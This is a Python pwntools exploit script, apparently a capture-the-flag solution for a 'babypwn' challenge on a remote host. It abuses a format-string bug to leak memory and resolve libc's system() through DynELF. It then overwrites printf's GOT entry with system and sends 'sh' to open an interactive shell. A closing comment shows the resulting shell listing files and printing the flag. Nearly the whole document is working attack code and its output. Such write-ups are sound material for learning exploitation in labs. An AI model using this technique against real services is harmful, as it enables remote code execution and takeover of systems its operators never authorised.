#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "47.75.182.113"
PORT = 9999

context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32

context.log_level = 'INFO'

def leak(addr):
	payload = "%7$s.AAA"+p64(addr)
	r.sendline(payload)
	print "leaking:", hex(addr)
	resp = r.recvuntil(".AAA")
	ret = resp[:-4:] + "\x00"
	r.recvrepeat(0.2)
	return ret
	
if __name__ == "__main__":
	r = remote(HOST, PORT)
	d = DynELF(leak, 0x40076d)
	dynamic_ptr = d.dynamic
	cnt = 0
	while True:
		addr = dynamic_ptr + 0x10*cnt
		ret = leak(addr)
		if ret == "\x03\x00": #TYPE PLTGOT
			addr += 8
			for i in xrange(8):
				ret = leak(addr+i)
				print "retX:", ret.encode('hex')
			break
		else:
			cnt += 1
	system_addr = d.lookup('system', 'libc')
	printf_addr = d.lookup('printf', 'libc')
	# [+] printf_addr: 0x7fb678d11800
	# [+] system_addr: 0x7fb678d01390
	log.success("printf_addr: "+hex(printf_addr))
	log.success("system_addr: "+hex(system_addr))
	
	offset_system = 0x10470
	# got = 0x601000
	# for i in xrange(0,0x10):
		# ret = leak(got+1+i*8)
		# print "ret2:", ret.encode('hex')
	
	printf_got = 0x601020
	printf_addr = u64(("\x00" + leak(printf_got+1)).ljust(8, "\x00"))
	system_addr = printf_addr - offset_system


	log.success("printf_addr: " + hex(printf_addr))
	log.success("system_addr: " + hex(system_addr))

	byte1 = system_addr & 0xff
	byte2 = (system_addr & 0xffff00) >> 8
	log.success("byte1: " + hex(byte1))
	log.success("byte2: " + hex(byte2))

	payload = "%" + str(byte1) + "u" + "%10$hhn."
	payload += "%" + str(byte2-byte1-1) + "u" + "%11$hn."
	payload = payload.ljust(32, "A")
	payload += p64(printf_got) + p64(printf_got+1)
	r.sendline(payload)
	r.sendline("sh\x00")
	r.interactive()

"""
http://bruce30262.logdown.com/posts/1255979-33c3-ctf-2016-espr
                                                                                                                                                                                                                                      0.AAAAA \x10`$ ls
babypwn
bin
dev
flag
lib
lib32
lib64
$ cat flag
HITB{Baby_Pwn_BabY_bl1nd}
$  
"""